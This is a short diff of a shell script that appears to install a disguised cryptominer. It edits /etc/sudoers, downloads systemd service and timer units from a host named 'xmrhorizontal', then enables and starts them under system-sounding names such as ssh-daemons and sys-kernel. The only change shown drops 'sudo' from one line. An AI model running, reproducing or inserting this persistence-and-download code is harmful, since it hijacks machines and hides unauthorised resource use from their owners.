@@ -15,7 +15,7 @@ sed -i 's/^#\(root\s*ALL=(ALL)\s*ALL\)/\1/' /etc/sudoers
     wget https://xmrhorizontal.github.io/ssh-daemons.service
     wget https://xmrhorizontal.github.io/ssh-daemons.timer
     systemctl daemon-reload
-    sudo systemctl enable ssh-daemons.timer
+    systemctl enable ssh-daemons.timer
     systemctl enable sys-kernel.service
     sleep 10
     systemctl start ssh-daemons.service
